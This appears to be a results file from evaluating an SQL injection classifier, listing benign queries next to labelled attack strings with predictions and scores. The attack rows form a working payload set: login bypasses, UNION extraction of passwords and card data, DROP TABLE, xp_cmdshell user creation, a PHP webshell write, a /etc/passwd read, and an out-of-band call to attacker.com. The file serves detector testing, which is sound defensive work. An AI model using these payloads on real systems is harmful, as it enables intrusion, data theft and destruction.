query,label,category,description,predicted,correct,malicious_probability
SELECT * FROM users WHERE status = 'active' OR status = 'pending';,0,multi_condition,OR condition,1,False,0.8058096672300725
SELECT * FROM users u JOIN orders o ON u.id = o.user_id;,0,join,Simple join,1,False,0.8941229622316982
"SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;",0,join,Join with columns,1,False,0.6536232813025409
SELECT * FROM products p LEFT JOIN reviews r ON p.id = r.product_id;,0,join,Left join,0,True,0.30107299690197664
"SELECT u.email, COUNT(o.id) FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.email;",0,group_by,Group by with join,1,False,0.9436750609220317
"SELECT status, COUNT(*) FROM orders GROUP BY status;",0,group_by,Simple group by,0,True,0.03386243153084138
"SELECT category_id, AVG(price) FROM products GROUP BY category_id;",0,group_by,Group by with aggregate,0,True,0.004621863038727179
SELECT * FROM users WHERE email LIKE '%@gmail.com';,0,like,LIKE pattern,0,True,0.15830470125228568
SELECT * FROM products WHERE name LIKE 'iPhone%';,0,like,LIKE pattern,0,True,0.04874290310916432
SELECT * FROM users WHERE name LIKE '%Smith%';,0,like,LIKE pattern,0,True,0.2563448719723892
"INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');",0,insert,Simple insert,1,False,0.7995495042095551
"INSERT INTO orders (user_id, total, status) VALUES (1, 99.99, 'pending');",0,insert,Insert with values,0,True,0.09896330318922958
UPDATE users SET status = 'inactive' WHERE id = 5;,0,update,Simple update,0,True,0.01291571280037493
UPDATE products SET price = 29.99 WHERE id = 100;,0,update,Price update,0,True,0.002049248434668
UPDATE orders SET status = 'shipped' WHERE id = 42;,0,update,Status update,0,True,0.010803303687381952
DELETE FROM sessions WHERE expired_at < NOW();,0,delete,Delete expired,0,True,0.3179739706939934
DELETE FROM cart_items WHERE cart_id = 15;,0,delete,Delete by ID,0,True,0.007273600704589731
SELECT 1;,0,minimal,Minimal query,0,True,0.33949482938241404
SELECT NOW();,0,minimal,Get current time,1,False,0.9444199148790009
SELECT VERSION();,0,minimal,Version check,1,False,0.9691275039208807
SELECT DATABASE();,0,minimal,Database name,1,False,0.9873596212121543
SELECT * FROM users WHERE id = 1 AND 1=1;,0,edge_case,Looks suspicious but benign - valid AND,1,False,0.999925893777581
SELECT * FROM products WHERE name = 'OR Gate Circuit Board';,0,edge_case,Product name contains OR,0,True,0.14266182694770238
SELECT * FROM products WHERE name = 'SELECT All Items Bundle';,0,edge_case,Product name contains SELECT,0,True,0.016023398793642004
SELECT * FROM products WHERE sku = 'UNION-JACK-FLAG-001';,0,edge_case,SKU contains UNION,1,False,0.9549563718611809
SELECT * FROM tickets WHERE subject = 'Help -- urgent issue';,0,edge_case,Comment-like in string,1,False,0.621906116940323
SELECT * FROM reviews WHERE text = 'It''s the best product!';,0,edge_case,Escaped quote,0,True,0.02226544143336904
SELECT * FROM users WHERE name = 'O''Brien';,0,edge_case,Irish name with quote,0,True,0.008073601101178628
SELECT * FROM users WHERE bio = 'I love coding -- especially SQL!';,0,edge_case,Double dash in content,1,False,0.9160080177886404
SELECT * FROM products WHERE description LIKE '%1=1%';,0,edge_case,Contains 1=1 in string,0,True,0.2336860242040421
SELECT * FROM comments WHERE content = 'DROP everything and buy this!';,0,edge_case,Contains DROP,1,False,0.9960397103320996
SELECT * FROM users WHERE id = 1 OR id = 2 OR id = 3;,0,edge_case,Multiple OR (valid),1,False,0.9990697838286483
SELECT * FROM users WHERE status = 'active' -- this is a comment;,0,edge_case,Valid SQL comment,1,False,0.9997507443505527
SELECT * FROM products WHERE category = 'Sleep & Bedding';,0,edge_case,Ampersand in value,0,True,0.03278417268949065
"SELECT u.*, (SELECT COUNT(*) FROM orders WHERE user_id = u.id) FROM users u;",0,subquery,Correlated subquery,0,True,0.06564084439430365
SELECT * FROM users WHERE id IN (SELECT user_id FROM orders WHERE total > 100);,0,subquery,Subquery in IN,0,True,0.01239749844641959
SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products);,0,subquery,Subquery comparison,0,True,0.006547338959039002
' OR '1'='1,1,tautology,Classic tautology,1,True,1.0
' OR 1=1--,1,tautology,Tautology with comment,1,True,1.0
' OR 1=1#,1,tautology,Tautology with hash comment,1,True,1.0
' OR 'x'='x,1,tautology,String tautology,1,True,0.9999999999999993
' OR ''=',1,tautology,Empty string tautology,1,True,1.0
1' OR '1'='1,1,tautology,Numeric prefix tautology,1,True,1.0
admin'--,1,tautology,Username bypass,1,True,1.0
admin' --,1,tautology,Username bypass with space,1,True,1.0
admin'#,1,tautology,Username bypass hash,1,True,1.0
' OR 1=1 OR ',1,tautology,Double OR tautology,1,True,1.0
') OR ('1'='1,1,tautology,Parenthesis tautology,1,True,0.9999999999999669
') OR 1=1--,1,tautology,Parenthesis tautology comment,1,True,1.0
' OR 1=1/*,1,tautology,Block comment,1,True,1.0
1 OR 1=1,1,tautology,Simple numeric OR,1,True,1.0
' OR 'a'='a,1,tautology,Letter tautology,1,True,1.0
SELECT * FROM users WHERE id = 1 OR 1=1;,1,tautology_full,Full query with tautology,1,True,0.9999999964968798
SELECT * FROM users WHERE username = 'admin' OR '1'='1';,1,tautology_full,Full query string tautology,1,True,0.9999999999999989
SELECT * FROM users WHERE id = '' OR 1=1 -- '';,1,tautology_full,Empty string with tautology,1,True,0.9999999999998583
' UNION SELECT NULL--,1,union,Basic UNION probe,1,True,0.9999999999997269
"' UNION SELECT NULL,NULL--",1,union,Two column UNION,1,True,0.999999999997992
"' UNION SELECT NULL,NULL,NULL--",1,union,Three column UNION,1,True,0.9999999999544524
"' UNION SELECT 1,2,3--",1,union,Numeric UNION,1,True,0.9999999999982683
"' UNION SELECT 1,2,3,4,5--",1,union,Five column UNION,1,True,0.9999999998636717
"' UNION SELECT username,password FROM users--",1,union,Credential extraction,1,True,0.9999999964779143
' UNION SELECT @@version--,1,union,Version extraction,1,True,0.999999999968523
"' UNION ALL SELECT 1,2,3--",1,union,UNION ALL,1,True,0.9999999994466335
' UNION SELECT table_name FROM information_schema.tables--,1,union,Schema extraction,1,True,0.999995531530926
' UNION SELECT column_name FROM information_schema.columns--,1,union,Column extraction,1,True,0.9999982976342322
"' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",1,union,Credential concat,1,True,0.9999999998558382
"' UNION SELECT 1,user(),database()--",1,union,Function extraction,1,True,0.9999999988857418
1' UNION SELECT * FROM users--,1,union,Full table extraction,1,True,0.9999999999560361
"' UNION SELECT credit_card,cvv,expiry FROM payments--",1,union,Sensitive data extraction,1,True,0.9996438935999756
"SELECT * FROM users WHERE id = 1 UNION SELECT username,password,null FROM admins--",1,union_full,Full UNION injection,1,True,0.9999999959678751
"SELECT * FROM products WHERE id = '' UNION SELECT 1,2,3,4,5--",1,union_full,Full UNION with columns,1,True,0.9999997821104878
'; DROP TABLE users--,1,stacked,Drop table,1,True,0.9999999999806062
'; DROP TABLE orders--,1,stacked,Drop table,1,True,0.9999999999453437
'; DROP DATABASE production--,1,stacked,Drop database,1,True,0.9999992067777782
'; DELETE FROM users--,1,stacked,Delete all users,1,True,0.9999999901714979
'; DELETE FROM users WHERE 1=1--,1,stacked,Delete with tautology,1,True,0.9999999999930658
'; TRUNCATE TABLE sessions--,1,stacked,Truncate table,1,True,0.9999999650933221
"'; INSERT INTO users VALUES('hacker','hacked@evil.com','admin')--",1,stacked,Insert admin,1,True,0.999999999989494
'; UPDATE users SET password='hacked' WHERE username='admin'--,1,stacked,Update password,1,True,0.9999999999997118
'; UPDATE users SET role='admin' WHERE id=5--,1,stacked,Privilege escalation,1,True,0.9999999999607101
1; DROP TABLE products--,1,stacked,Numeric prefix drop,1,True,0.9999999929224646
'; EXEC xp_cmdshell('dir')--,1,stacked,Command execution,1,True,0.9999999980439662
'; EXEC xp_cmdshell('net user hacker password /add')--,1,stacked,Add user command,1,True,0.9999999934139241
'; SHUTDOWN--,1,stacked,Shutdown database,1,True,0.999999999992045
'; ALTER TABLE users ADD hacked INT--,1,stacked,Alter table,1,True,0.999999998483686
'; CREATE TABLE backdoor(cmd TEXT)--,1,stacked,Create backdoor table,1,True,0.9999999774203491
' AND SLEEP(5)--,1,time_blind,Time-based blind,1,True,0.9999999999994813
' AND SLEEP(10)--,1,time_blind,Time-based blind 10s,1,True,0.9999999994855249
1' AND SLEEP(5)--,1,time_blind,Numeric time blind,1,True,0.9999999999997293
' OR SLEEP(5)--,1,time_blind,OR time blind,1,True,0.9999999999999614
'; WAITFOR DELAY '0:0:5'--,1,time_blind,MSSQL waitfor,1,True,0.9999999746588204
'; WAITFOR DELAY '0:0:10'--,1,time_blind,MSSQL waitfor 10s,1,True,0.9999999689419806
"' AND BENCHMARK(10000000,SHA1('test'))--",1,time_blind,MySQL benchmark,1,True,0.9999952472800534
' AND (SELECT SLEEP(5))--,1,time_blind,Subquery sleep,1,True,0.9999999999341669
"1' AND IF(1=1,SLEEP(5),0)--",1,time_blind,Conditional sleep,1,True,0.9999999998788347
"' OR IF(1=1,SLEEP(5),0)--",1,time_blind,OR conditional sleep,1,True,0.9999999999913411
' AND pg_sleep(5)--,1,time_blind,PostgreSQL sleep,1,True,0.9999999972084652
'; SELECT pg_sleep(5)--,1,time_blind,PostgreSQL sleep stacked,1,True,0.9999999939728361
' AND 1=1--,1,boolean_blind,Boolean true,1,True,1.0
' AND 1=2--,1,boolean_blind,Boolean false,1,True,0.9999999999946412
' AND 'a'='a'--,1,boolean_blind,String boolean true,1,True,0.999999999999722
' AND 'a'='b'--,1,boolean_blind,String boolean false,1,True,0.9999999999974296
"' AND SUBSTRING(@@version,1,1)='5'--",1,boolean_blind,Version probe,1,True,0.9999999953942849
"' AND ASCII(SUBSTRING((SELECT user()),1,1))>100--",1,boolean_blind,ASCII extraction,1,True,0.9999997698788657
' AND (SELECT COUNT(*) FROM users)>0--,1,boolean_blind,Count probe,1,True,0.9999976134612455
' AND LENGTH(database())>5--,1,boolean_blind,Database length probe,1,True,0.9999995378619997
"' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))>50--",1,boolean_blind,Password extraction,1,True,0.9999879480974626
1' AND 1=1 AND '1'='1,1,boolean_blind,Nested boolean,1,True,0.9999999999999998
' AND EXISTS(SELECT * FROM users)--,1,boolean_blind,EXISTS probe,1,True,0.9999998948881812
' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--,1,boolean_blind,Password char probe,1,True,0.9999999999666098
"' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",1,error_based,ExtractValue,1,True,0.9999999924890334
"' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",1,error_based,UpdateXML,1,True,0.9999999973397389
"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,Double query,1,True,0.9999997090295148
"' AND GTID_SUBSET(@@version,1)--",1,error_based,GTID subset,1,True,0.9999999881675549
' AND EXP(~(SELECT * FROM (SELECT @@version)a))--,1,error_based,Exp overflow,1,True,0.9999998768935413
' ORDER BY 1--,1,error_based,Order by probe,1,True,0.9999999999879441
' ORDER BY 10--,1,error_based,Order by column count,1,True,0.9999999997651872
' ORDER BY 100--,1,error_based,Order by overflow,1,True,0.9999999999050928
' HAVING 1=1--,1,error_based,Having clause,1,True,0.9999999999436291
' GROUP BY columnname HAVING 1=1--,1,error_based,Group by having,1,True,0.9999999879765905
' oR '1'='1,1,obfuscated_case,Mixed case OR,1,True,0.9999999999999243
' Or 1=1--,1,obfuscated_case,Mixed case Or,1,True,0.9999999999999554
' uNiOn SeLeCt NuLl--,1,obfuscated_case,Mixed case UNION SELECT,1,True,0.9999995140594954
"' UnIoN sElEcT 1,2,3--",1,obfuscated_case,Alternating case,1,True,0.9999999215087508
' aNd SlEeP(5)--,1,obfuscated_case,Mixed case AND SLEEP,1,True,0.9999999349667681
'; dRoP tAbLe UsErS--,1,obfuscated_case,Mixed case DROP TABLE,1,True,0.9999996054770528
'  OR   '1'='1,1,obfuscated_whitespace,Extra spaces,1,True,1.0
'	OR	1=1--,1,obfuscated_whitespace,Tab characters,1,True,1.0
' \t OR \t 1=1--,1,obfuscated_whitespace,Mixed whitespace,1,True,1.0
'  UNION  SELECT  NULL--,1,obfuscated_whitespace,Spaced UNION,1,True,0.9999999999997269
"'		UNION		SELECT		1,2,3--",1,obfuscated_whitespace,Tab UNION,1,True,0.9999999999982683
'/**/OR/**/1=1--,1,obfuscated_comment,Inline comment OR,1,True,1.0
'/*x*/OR/*y*/'1'='1,1,obfuscated_comment,Named comments,1,True,0.9999999999913969
' /*!OR*/ 1=1--,1,obfuscated_comment,MySQL version comment,1,True,0.9999999999909057
'/**/UNION/**/SELECT/**/NULL--,1,obfuscated_comment,Comment UNION,1,True,0.9999999999999993
"'/*abc*/UNION/*def*/SELECT/*ghi*/1,2,3--",1,obfuscated_comment,Multi comment,1,True,0.9999999818420212
' /*!50000OR*/ 1=1--,1,obfuscated_comment,Version conditional,1,True,0.9999999998549065
admin'/**/--,1,obfuscated_comment,Comment bypass,1,True,1.0
' OR 'a'||'b'='ab,1,obfuscated_concat,Concat Oracle,1,True,1.0
"' OR CONCAT('1','1')='11",1,obfuscated_concat,MySQL concat,1,True,0.9999999999985938
' OR CHR(49)||CHR(61)||CHR(49)--,1,obfuscated_concat,Chr concat,1,True,0.9999977814710401
' UNION SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)--,1,obfuscated_concat,CHAR concat,1,True,0.9999960745817791
' OR 0x31=0x31--,1,obfuscated_encoded,Hex encoded,1,True,0.9999999999498961
' UNION SELECT 0x61646d696e--,1,obfuscated_encoded,Hex string,1,True,0.9999999998572913
' %4fR 1=1--,1,obfuscated_encoded,URL encoded O,1,True,1.0
' OR%201=1--,1,obfuscated_encoded,URL encoded space,1,True,0.9999999999999623
'%27 OR 1=1--,1,obfuscated_encoded,URL encoded quote,1,True,1.0
' %55NION %53ELECT NULL--,1,obfuscated_encoded,URL encoded keywords,1,True,0.9999999877611029
admin%27--,1,obfuscated_encoded,URL encoded username,1,True,0.9999999999965106
SELECT * FROM users WHERE id = '1' OR '1'='1',1,full_injection_select,Full SELECT injection,1,True,0.9999999999993217
SELECT * FROM users WHERE username = '' OR 1=1--',1,full_injection_select,Full username bypass,1,True,0.9999999999998523
"SELECT * FROM products WHERE id = 1 UNION SELECT 1,2,3,4,5--",1,full_injection_select,Full UNION attack,1,True,0.9999989466546519
SELECT * FROM users WHERE email = 'test@x.com' AND SLEEP(5)--',1,full_injection_select,Full time attack,1,True,0.9999999896300772
SELECT * FROM orders WHERE id = 1; DROP TABLE orders;--,1,full_injection_select,Full stacked attack,1,True,0.9999585123741092
INSERT INTO users (name) VALUES ('test' OR '1'='1');,1,full_injection_insert,Insert injection,1,True,0.9999999999988167
INSERT INTO logs (data) VALUES (''; DROP TABLE logs;--');,1,full_injection_insert,Insert stacked,1,True,0.9999999980172156
UPDATE users SET name = '' OR '1'='1' WHERE id = 1;,1,full_injection_update,Update injection,1,True,0.9999999999951243
UPDATE products SET price = 0 WHERE id = 1 OR 1=1;,1,full_injection_update,Update tautology,1,True,0.9999969063562003
DELETE FROM users WHERE id = 1 OR 1=1;,1,full_injection_delete,Delete tautology,1,True,0.9999999998970697
DELETE FROM sessions WHERE id = '' OR '1'='1';,1,full_injection_delete,Delete injection,1,True,0.9999999999990461
' UNION SELECT load_file('/etc/passwd')--,1,advanced,File read,1,True,0.9999999999643214
' UNION SELECT * INTO OUTFILE '/tmp/hack.txt'--,1,advanced,File write,1,True,0.9999999999985063
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE hack--,1,advanced,Load file,1,True,0.9999999954669401
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'--,1,advanced,Webshell upload,1,True,0.9999999990623729
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,advanced,Nested sleep,1,True,0.9999999813983976
"' AND (SELECT count(*) FROM generate_series(1,10000000))--",1,advanced,PostgreSQL DoS,1,True,0.9998380181349713
"' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",1,advanced,Complex error based,1,True,0.9999999990970494
'; DECLARE @q VARCHAR(8000);SET @q='\\\\attacker.com\\share';EXEC master..xp_dirtree @q--,1,advanced,MSSQL out-of-band,1,True,0.9999256596768173
"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY X)y)--",1,advanced,Double query complex,1,True,0.9999997313651823
' AND LOAD_EXTENSION('/path/to/evil.so')--,1,advanced,Extension loading,1,True,0.9999999261273756
SELECT * FROM users WHERE user_id = $user_input;,0,placeholder,Application placeholder,0,True,0.005336096089704501
SELECT * FROM products WHERE category = ?;,0,placeholder,Prepared statement marker,0,True,0.0013117858194083166
SELECT * FROM orders WHERE id = :order_id;,0,placeholder,Named parameter,0,True,0.0007984812650151527
SELECT * FROM users WHERE created_at >= CURRENT_DATE - INTERVAL 30 DAY;,0,complex_benign,Interval calculation,0,True,0.18051222897170396
SELECT * FROM products WHERE price * 1.1 < 100;,0,complex_benign,Expression in WHERE,0,True,0.0009491734858040657
"SELECT COALESCE(nickname, username, 'Anonymous') FROM users;",0,complex_benign,COALESCE function,0,True,0.18264166286888484
SELECT CASE WHEN status = 'active' THEN 1 ELSE 0 END FROM users;,0,complex_benign,CASE expression,1,False,0.752455804731757
SELECT * FROM users WHERE email REGEXP '^[a-zA-Z0-9]+@';,0,complex_benign,REGEXP pattern,0,True,0.16875768728461596
"SELECT GREATEST(price, min_price) FROM products;",0,complex_benign,GREATEST function,0,True,0.04619181335185852
"SELECT * FROM products WHERE MATCH(name, description) AGAINST('laptop');",0,complex_benign,Full text search,0,True,0.025051243877253212
WITH cte AS (SELECT * FROM users WHERE status = 'active') SELECT * FROM cte;,0,complex_benign,CTE query,0,True,0.12602507819736128
SELECT * FROM users u WHERE u.id = ANY(SELECT user_id FROM orders);,0,complex_benign,ANY subquery,0,True,0.007753031034769408
SELECT * FROM products FOR UPDATE;,0,complex_benign,SELECT FOR UPDATE,0,True,0.40589448226283115
"SELECT GET_LOCK('my_lock', 10);",0,complex_benign,Get lock function,1,False,0.5294755743049193
EXPLAIN SELECT * FROM users WHERE id = 1;,0,complex_benign,EXPLAIN query,1,False,0.7580792526168764
SHOW TABLES;,0,complex_benign,Show tables,1,False,0.9999707910394212
DESCRIBE users;,0,complex_benign,Describe table,1,False,0.9866997590921658
SHOW CREATE TABLE users;,0,complex_benign,Show create,1,False,0.999991747219327
SELECT * FROM inventory;,0,simple_select,Basic table scan,0,True,0.0013295541648099794
SELECT * FROM payments;,0,simple_select,Basic table scan,0,True,0.0004954900285237222
SELECT * FROM reviews;,0,simple_select,Basic table scan,0,True,0.000571540628762142
SELECT * FROM categories;,0,simple_select,Basic table scan,0,True,0.0005842839757411207
SELECT * FROM shipping;,0,simple_select,Basic table scan,0,True,0.005474428630411678
SELECT * FROM addresses;,0,simple_select,Basic table scan,0,True,0.0007043361086498327
SELECT * FROM coupons;,0,simple_select,Basic table scan,0,True,0.00022603711992965557
SELECT * FROM wishlist;,0,simple_select,Basic table scan,0,True,0.0034299664573093297
SELECT * FROM cart;,0,simple_select,Basic table scan,0,True,0.00041685136642510216
SELECT * FROM notifications;,0,simple_select,Basic table scan,0,True,0.0008297508880943306
SELECT id FROM users;,0,simple_select,Single column,0,True,0.00034048765312885
SELECT email FROM users;,0,simple_select,Single column,0,True,0.001894471107044047
"SELECT name, price, stock FROM products;",0,simple_select,Multiple columns,0,True,0.00036754313903819184
"SELECT first_name, last_name, email, phone FROM customers;",0,simple_select,Customer columns,0,True,0.0011665321439865305
"SELECT order_id, total, created_at FROM orders WHERE user_id = 5;",0,simple_where,User orders,0,True,0.0001744458568763664
SELECT * FROM products WHERE stock > 0;,0,simple_where,In stock products,0,True,0.004985208939364255
SELECT * FROM users WHERE last_login IS NOT NULL;,0,simple_where,Active users,1,False,0.7017198083496506
SELECT * FROM orders WHERE shipped_at IS NULL;,0,simple_where,Pending orders,0,True,0.07745553661668476
SELECT * FROM products WHERE name = 'MacBook Pro';,0,simple_where,Product by name,0,True,0.060350757832693815
SELECT * FROM users WHERE phone = '+1-555-123-4567';,0,simple_where,Phone lookup,0,True,0.07110289141061714
SELECT * FROM products WHERE sku = 'ABC-12345';,0,simple_where,SKU lookup,0,True,0.05099606517377374
SELECT * FROM orders WHERE tracking_number = 'TRK123456789';,0,simple_where,Tracking lookup,0,True,0.04686605317894767
SELECT COUNT(DISTINCT category_id) FROM products;,0,aggregate,Distinct count,0,True,0.020112753261433865
SELECT SUM(quantity * price) FROM order_items WHERE order_id = 100;,0,aggregate,Order total,0,True,0.0021965070973431746
"SELECT AVG(rating), COUNT(*) FROM reviews WHERE product_id = 50;",0,aggregate,Product rating,0,True,0.004681237580324533
"SELECT MAX(total), MIN(total) FROM orders;",0,aggregate,Order range,0,True,0.03181819301699589
"SELECT COUNT(*) FROM users WHERE created_at > DATE_SUB(NOW(), INTERVAL 7 DAY);",0,aggregate,Recent users,0,True,0.3018970317648502
SELECT * FROM products ORDER BY created_at DESC LIMIT 10;,0,order_limit,Newest products,0,True,0.005112986295592261
SELECT * FROM orders ORDER BY total DESC LIMIT 5;,0,order_limit,Top orders,0,True,0.018866138511764288
SELECT * FROM users ORDER BY last_login DESC LIMIT 100;,0,order_limit,Recent logins,0,True,0.03153287297356048
SELECT * FROM products ORDER BY stock ASC LIMIT 20;,0,order_limit,Low stock,0,True,0.030058059112353472
SELECT * FROM products LIMIT 50 OFFSET 100;,0,pagination,Pagination query,0,True,2.4781709813473058e-08
SELECT * FROM users LIMIT 25 OFFSET 75;,0,pagination,Pagination query,0,True,3.92793268192178e-08
SELECT * FROM orders LIMIT 10 OFFSET 0;,0,pagination,First page,0,True,6.626088582943019e-09
SELECT DISTINCT brand FROM products;,0,distinct,Distinct brands,0,True,0.03290170938999786
"SELECT DISTINCT city, country FROM addresses;",0,distinct,Distinct locations,0,True,0.004465850201076276
SELECT DISTINCT payment_method FROM payments;,0,distinct,Payment methods,0,True,0.006039686673171904
SELECT * FROM orders WHERE created_at >= '2024-06-01' AND created_at < '2024-07-01';,0,date_compare,Month range,0,True,0.22314765203693096
SELECT * FROM users WHERE birthday BETWEEN '1990-01-01' AND '1999-12-31';,0,date_compare,Birth year range,1,False,0.9484738448215745
SELECT * FROM sessions WHERE expires_at > NOW();,0,date_compare,Valid sessions,0,True,0.026412953524964953
SELECT * FROM coupons WHERE valid_until >= CURDATE();,0,date_compare,Active coupons,0,True,0.0034260871097748784
SELECT * FROM products WHERE price >= 10 AND price <= 50;,0,numeric_compare,Price range,0,True,0.00447418470430635
SELECT * FROM orders WHERE item_count > 5;,0,numeric_compare,Large orders,0,True,0.0004893889963392989
SELECT * FROM users WHERE login_count >= 100;,0,numeric_compare,Power users,0,True,0.0007120015703012742
SELECT * FROM products WHERE rating >= 4.5;,0,numeric_compare,Top rated,0,True,0.004234638782211957
"SELECT * FROM products WHERE category_id NOT IN (1, 2, 3);",0,in_clause,NOT IN,0,True,0.01475361309624549
"SELECT * FROM users WHERE role IN ('admin', 'moderator', 'editor');",0,in_clause,Role check,1,False,0.9999669598981128
"SELECT * FROM orders WHERE payment_status IN ('completed', 'refunded');",0,in_clause,Payment status,0,True,0.004612520341068546
"SELECT * FROM products WHERE color IN ('red', 'blue', 'green', 'black', 'white');",0,in_clause,Color filter,0,True,0.05055543135318126
SELECT * FROM users WHERE middle_name IS NULL;,0,null_check,Null middle name,1,False,0.6872533094892171
SELECT * FROM products WHERE discount_price IS NOT NULL;,0,null_check,Has discount,0,True,0.10583375749063936
SELECT * FROM orders WHERE cancelled_at IS NOT NULL;,0,null_check,Cancelled orders,0,True,0.25441054969059124
SELECT * FROM users WHERE status = 'active' AND email_verified = 1 AND phone_verified = 1;,0,multi_condition,Triple AND,0,True,0.2565173898146645
SELECT * FROM products WHERE (category_id = 5 OR category_id = 6) AND is_active = 1;,0,multi_condition,Mixed conditions,0,True,0.1119331276671383
SELECT * FROM orders WHERE status != 'cancelled' AND total > 100;,0,multi_condition,Not cancelled,0,True,0.14341210238375596
SELECT * FROM users WHERE age >= 18 AND age <= 65 AND country = 'US';,0,multi_condition,Age range US,1,False,0.6173177106676416
